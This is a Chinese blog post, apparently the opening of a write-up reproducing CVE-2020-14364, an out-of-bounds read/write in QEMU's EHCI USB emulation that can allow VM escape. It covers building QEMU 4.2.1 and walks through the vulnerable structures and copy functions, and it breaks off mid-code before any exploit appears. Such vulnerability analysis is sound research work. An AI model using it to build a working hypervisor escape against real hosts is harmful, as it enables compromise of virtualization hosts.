

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="l1s00t">
  <meta name="keywords" content="">
  
    <meta name="description" content="CVE-2020-14364QEMU的USB后端在实现USB控制器与USB设备通信时存在越界读写漏洞可能导致虚拟机逃逸。 环境搭建漏洞复现Qemu版本为v4.2.1  安装依赖 安装spice-protocol： 123456wget https:&#x2F;&#x2F;spice-space.org&#x2F;download&#x2F;releases&#x2F;spice-protocol-0.12.10.tar.bz2tar xvf sp">
<meta property="og:type" content="article">
<meta property="og:title" content="QEMU: CVE-2020-14364漏洞复现">
<meta property="og:url" content="http://example.com/2024/08/23/QEMU-CVE-2020-14364%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="CVE-2020-14364QEMU的USB后端在实现USB控制器与USB设备通信时存在越界读写漏洞可能导致虚拟机逃逸。 环境搭建漏洞复现Qemu版本为v4.2.1  安装依赖 安装spice-protocol： 123456wget https:&#x2F;&#x2F;spice-space.org&#x2F;download&#x2F;releases&#x2F;spice-protocol-0.12.10.tar.bz2tar xvf sp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/CVE-2020-14364/image-20240726103418073.png">
<meta property="og:image" content="http://example.com/img/CVE-2020-14364/image-20240725104008232.png">
<meta property="og:image" content="http://example.com/img/CVE-2020-14364/image-20240724225704740.png">
<meta property="og:image" content="http://example.com/img/CVE-2020-14364/image-20240725212516328.png">
<meta property="og:image" content="http://example.com/img/CVE-2020-14364/image-20240725212615547.png">
<meta property="og:image" content="http://example.com/img/CVE-2020-14364/image-20240723223839991.png">
<meta property="og:image" content="http://example.com/img/CVE-2020-14364/image-20240723223738928.png">
<meta property="og:image" content="http://example.com/img/CVE-2020-14364/image-20240723224353162.png">
<meta property="article:published_time" content="2024-08-23T10:49:04.000Z">
<meta property="article:modified_time" content="2024-08-23T10:49:04.000Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="cve qemu usb">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/CVE-2020-14364/image-20240726103418073.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>QEMU: CVE-2020-14364漏洞复现 - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>l1s00t</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="QEMU: CVE-2020-14364漏洞复现"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-08-23 18:49" pubdate>
          2024年8月23日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          54k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          224 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">QEMU: CVE-2020-14364漏洞复现</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="CVE-2020-14364"><a href="#CVE-2020-14364" class="headerlink" title="CVE-2020-14364"></a>CVE-2020-14364</h1><p>QEMU的USB后端在实现USB控制器与USB设备通信时存在越界读写漏洞可能导致虚拟机逃逸。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>漏洞复现Qemu版本为<code>v4.2.1</code> </p>
<p><strong>安装依赖</strong></p>
<p>安装spice-protocol：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>spice-space.org<span class="hljs-regexp">/download/</span>releases/spice-protocol-<span class="hljs-number">0.12</span>.<span class="hljs-number">10</span>.tar.bz2<br>tar xvf spice-protocol-<span class="hljs-number">0.12</span>.<span class="hljs-number">10</span>.tar.bz2<br>cd spice-protocol-<span class="hljs-number">0.12</span>.<span class="hljs-number">10</span>/<br>./configure <br>make<br>sudo make install<br></code></pre></td></tr></table></figure>

<p>安装celt：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span>downloads.us.xiph.org<span class="hljs-regexp">/releases/</span>celt/celt-<span class="hljs-number">0.5</span>.<span class="hljs-number">1.3</span>.tar.gz<br>tar zxvf celt-<span class="hljs-number">0.5</span>.<span class="hljs-number">1.3</span>.tar.gz <br>cd celt-<span class="hljs-number">0.5</span>.<span class="hljs-number">1.3</span>/<br> ./configure <br> make<br> sudo make install<br></code></pre></td></tr></table></figure>

<p>安装依赖：</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt install libjpeg-<span class="hljs-built_in">dev</span><br>sudo apt-<span class="hljs-built_in">get</span> install libsasl2-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure>

<p>安装spice-server</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>spice-space.org<span class="hljs-regexp">/download/</span>releases<span class="hljs-regexp">/spice-server/</span>spice-<span class="hljs-number">0.12</span>.<span class="hljs-number">7</span>.tar.bz2<br>tar xvf spice-<span class="hljs-number">0.12</span>.<span class="hljs-number">7</span>.tar.bz2<br>cd spice-<span class="hljs-number">0.12</span>.<span class="hljs-number">7</span>/<br>./configure <br> make<br> sudo make install<br></code></pre></td></tr></table></figure>

<p>编译qemu</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/qemu/qemu.git<br>git checkout tags/4.2.1<br>mkdir build &amp;&amp; cd build<br>../configure --target-list=x86_64-softmmu --enable-debug --disable-werror --enable-spice<br>make -j6<br></code></pre></td></tr></table></figure>

<p>高版本<code>ld</code>版本不支持编译qemu-4.2.1，降低<code>ld</code>版本。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://ftp.gnu.org/gnu/binutils/binutils-2.30.tar.gz<br>tar -xvf binutils-2.30.tar.gz<br>cd binutils-2.30<br>./configure --prefix=/usr/local/binutils <br>make -j6<br>sudo make install<br><span class="hljs-meta prompt_"># </span><span class="language-bash">替换掉高版本的ld</span><br>cd /usr/local/binutils<br>sudo mv /usr/bin/ld /usr/bin/ld.back<br>sudo ln -s /usr/local/binutils/bin/ld /usr/bin/ld<br></code></pre></td></tr></table></figure>



<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><strong>关键结构体</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* definition of a USB device */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">USBDevice</span> &#123;</span><br>    DeviceState qdev;<br>    USBPort *port;<br>    <span class="hljs-type">char</span> *port_path;<br>    <span class="hljs-type">char</span> *serial;<br>    <span class="hljs-type">void</span> *opaque;<br>    <span class="hljs-type">uint32_t</span> flags;<br><br>    <span class="hljs-comment">/* Actual connected speed */</span><br>    <span class="hljs-type">int</span> speed;<br>    <span class="hljs-comment">/* Supported speeds, not in info because it may be variable (hostdevs) */</span><br>    <span class="hljs-type">int</span> speedmask;<br>    <span class="hljs-type">uint8_t</span> addr;<br>    <span class="hljs-type">char</span> product_desc[<span class="hljs-number">32</span>];<br>    <span class="hljs-type">int</span> auto_attach;<br>    <span class="hljs-type">bool</span> attached;<br><br>    <span class="hljs-type">int32_t</span> state;<br>    <span class="hljs-type">uint8_t</span> setup_buf[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">uint8_t</span> data_buf[<span class="hljs-number">4096</span>];		<span class="hljs-comment">// key data</span><br>    <span class="hljs-type">int32_t</span> remote_wakeup;<br>    <span class="hljs-type">int32_t</span> setup_state;<br>    <span class="hljs-type">int32_t</span> setup_len;<br>    <span class="hljs-type">int32_t</span> setup_index;<br><br>    USBEndpoint ep_ctl;<br>    USBEndpoint ep_in[USB_MAX_ENDPOINTS];<br>    USBEndpoint ep_out[USB_MAX_ENDPOINTS];<br><br>    QLIST_HEAD(, USBDescString) strings;<br>    <span class="hljs-type">const</span> USBDesc *usb_desc; <span class="hljs-comment">/* Overrides class usb_desc if not NULL */</span><br>    <span class="hljs-type">const</span> USBDescDevice *device;<br><br>    <span class="hljs-type">int</span> configuration;<br>    <span class="hljs-type">int</span> ninterfaces;<br>    <span class="hljs-type">int</span> altsetting[USB_MAX_INTERFACES];<br>    <span class="hljs-type">const</span> USBDescConfig *config;<br>    <span class="hljs-type">const</span> USBDescIface  *ifaces[USB_MAX_INTERFACES];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIState</span></span><br><span class="hljs-class">&#123;</span><br>    USBBus bus;<br>    DeviceState *device;<br>    qemu_irq irq;<br>    MemoryRegion mem;<br>    AddressSpace *as;<br>    MemoryRegion mem_caps;<br>    MemoryRegion mem_opreg;<br>    MemoryRegion mem_ports;<br>    <span class="hljs-type">int</span> companion_count;<br>    <span class="hljs-type">bool</span> companion_enable;<br>    <span class="hljs-type">uint16_t</span> capsbase;<br>    <span class="hljs-type">uint16_t</span> opregbase;<br>    <span class="hljs-type">uint16_t</span> portscbase;<br>    <span class="hljs-type">uint16_t</span> portnr;<br><br>    <span class="hljs-comment">/* properties */</span><br>    <span class="hljs-type">uint32_t</span> maxframes;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     *  EHCI spec version 1.0 Section 2.3</span><br><span class="hljs-comment">     *  Host Controller Operational Registers</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">uint8_t</span> caps[CAPA_SIZE];<br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-type">uint32_t</span> opreg[<span class="hljs-number">0x44</span> / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint32_t</span>)];<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">        &#123;</span><br>            <span class="hljs-type">uint32_t</span> usbcmd;<br>            <span class="hljs-type">uint32_t</span> usbsts;<br>            <span class="hljs-type">uint32_t</span> usbintr;<br>            <span class="hljs-type">uint32_t</span> frindex;<br>            <span class="hljs-type">uint32_t</span> ctrldssegment;<br>            <span class="hljs-type">uint32_t</span> periodiclistbase;<br>            <span class="hljs-type">uint32_t</span> asynclistaddr;<br>            <span class="hljs-type">uint32_t</span> notused[<span class="hljs-number">9</span>];<br>            <span class="hljs-type">uint32_t</span> configflag;<br>        &#125;;<br>    &#125;;<br>    <span class="hljs-type">uint32_t</span> portsc[NB_PORTS];<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     *  Internal states, shadow registers, etc</span><br><span class="hljs-comment">     */</span><br>    QEMUTimer *frame_timer;<br>    QEMUBH *async_bh;<br>    <span class="hljs-type">bool</span> working;<br>    <span class="hljs-type">uint32_t</span> astate; <span class="hljs-comment">/* Current state in asynchronous schedule */</span><br>    <span class="hljs-type">uint32_t</span> pstate; <span class="hljs-comment">/* Current state in periodic schedule     */</span><br>    USBPort ports[NB_PORTS];<br>    USBPort *companion_ports[NB_PORTS];<br>    <span class="hljs-type">uint32_t</span> usbsts_pending;<br>    <span class="hljs-type">uint32_t</span> usbsts_frindex;<br>    EHCIQueueHead aqueues;<br>    EHCIQueueHead pqueues;<br><br>    <span class="hljs-comment">/* which address to look at next */</span><br>    <span class="hljs-type">uint32_t</span> a_fetch_addr;<br>    <span class="hljs-type">uint32_t</span> p_fetch_addr;<br><br>    USBPacket ipacket;<br>    QEMUSGList isgl;<br><br>    <span class="hljs-type">uint64_t</span> last_run_ns;<br>    <span class="hljs-type">uint32_t</span> async_stepdown;<br>    <span class="hljs-type">uint32_t</span> periodic_sched_active;<br>    <span class="hljs-type">bool</span> int_req_by_async;<br>    VMChangeStateEntry *vmstate;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p><strong>关键函数</strong></p>
<p><code>usb_packet_copy</code> 函数根据<code>p-&gt;pid</code> 判断调用<code>iov_to_buf</code> 函数或者是<code>iov_from_buf</code> 函数。在漏洞利用过程中，<code>iov_from_buf</code>函数将<code>s-&gt;data_buf + s-&gt;setup_index</code> 复制到<code>iov-&gt;iov.base</code> 用户空间中，实现设备空间读。<code>iov_to_buf</code> 函数将<code>iov-&gt;iov.base</code> 复制到<code>s-&gt;data_buf + s-&gt;setup_index</code> 设备空间中，实现设备空间写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">usb_packet_copy</span><span class="hljs-params">(USBPacket *p, <span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> bytes)</span><br>&#123;<br>    QEMUIOVector *iov = p-&gt;combined ? &amp;p-&gt;combined-&gt;iov : &amp;p-&gt;iov;<br><br>    assert(p-&gt;actual_length &gt;= <span class="hljs-number">0</span>);<br>    assert(p-&gt;actual_length + bytes &lt;= iov-&gt;size);<br>    <span class="hljs-keyword">switch</span> (p-&gt;pid) &#123;<br>    <span class="hljs-keyword">case</span> USB_TOKEN_SETUP:<br>    <span class="hljs-keyword">case</span> USB_TOKEN_OUT:<br>        iov_to_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> USB_TOKEN_IN:<br>        iov_from_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s: invalid pid: %x\n&quot;</span>, __func__, p-&gt;pid);<br>        <span class="hljs-built_in">abort</span>();<br>    &#125;<br>    p-&gt;actual_length += bytes;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">size_t</span><br><span class="hljs-title function_">iov_from_buf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> iovec *iov, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> iov_cnt,</span><br><span class="hljs-params">             <span class="hljs-type">size_t</span> offset, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> bytes)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (__builtin_constant_p(bytes) &amp;&amp; iov_cnt &amp;&amp;<br>        offset &lt;= iov[<span class="hljs-number">0</span>].iov_len &amp;&amp; bytes &lt;= iov[<span class="hljs-number">0</span>].iov_len - offset) &#123;<br>        <span class="hljs-built_in">memcpy</span>(iov[<span class="hljs-number">0</span>].iov_base + offset, buf, bytes);<br>        <span class="hljs-keyword">return</span> bytes;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> iov_from_buf_full(iov, iov_cnt, offset, buf, bytes);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">size_t</span><br><span class="hljs-title function_">iov_to_buf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> iovec *iov, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> iov_cnt,</span><br><span class="hljs-params">           <span class="hljs-type">size_t</span> offset, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> bytes)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (__builtin_constant_p(bytes) &amp;&amp; iov_cnt &amp;&amp;<br>        offset &lt;= iov[<span class="hljs-number">0</span>].iov_len &amp;&amp; bytes &lt;= iov[<span class="hljs-number">0</span>].iov_len - offset) &#123;<br>        <span class="hljs-built_in">memcpy</span>(buf, iov[<span class="hljs-number">0</span>].iov_base + offset, bytes);<br>        <span class="hljs-keyword">return</span> bytes;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> iov_to_buf_full(iov, iov_cnt, offset, buf, bytes);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>上述<code>iov-&gt;iov.base</code> 是用户可以控制的地址，具体可从以下函数追溯。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ehci_execute</span><br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">if</span> (p-&gt;async == EHCI_ASYNC_NONE)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ehci_init_transfer(p) != <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br><br>        spd = (p-&gt;pid == USB_TOKEN_IN &amp;&amp; NLPTR_TBIT(p-&gt;qtd.altnext) == <span class="hljs-number">0</span>);<br>        usb_packet_setup(&amp;p-&gt;packet, p-&gt;pid, ep, <span class="hljs-number">0</span>, p-&gt;qtdaddr, spd,<br>                         (p-&gt;qtd.token &amp; QTD_TOKEN_IOC) != <span class="hljs-number">0</span>);<br>        usb_packet_map(&amp;p-&gt;packet, &amp;p-&gt;sgl);<br>        p-&gt;async = EHCI_ASYNC_INITIALIZED;<br>    &#125;<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">usb_packet_map</span><span class="hljs-params">(USBPacket *p, QEMUSGList *sgl)</span><br>&#123;<br>    DMADirection dir = (p-&gt;pid == USB_TOKEN_IN) ?<br>        DMA_DIRECTION_FROM_DEVICE : DMA_DIRECTION_TO_DEVICE;<br>    <span class="hljs-type">void</span> *mem;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sgl-&gt;nsg; i++) &#123;<br>        <span class="hljs-type">dma_addr_t</span> base = sgl-&gt;sg[i].base;<br>        <span class="hljs-type">dma_addr_t</span> len = sgl-&gt;sg[i].len;<br><br>        <span class="hljs-keyword">while</span> (len) &#123;<br>            <span class="hljs-type">dma_addr_t</span> xlen = len;<br>            mem = dma_memory_map(sgl-&gt;as, base, &amp;xlen, dir);<br>            <span class="hljs-keyword">if</span> (!mem) &#123;<br>                <span class="hljs-keyword">goto</span> err;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (xlen &gt; len) &#123;<br>                xlen = len;<br>            &#125;<br>            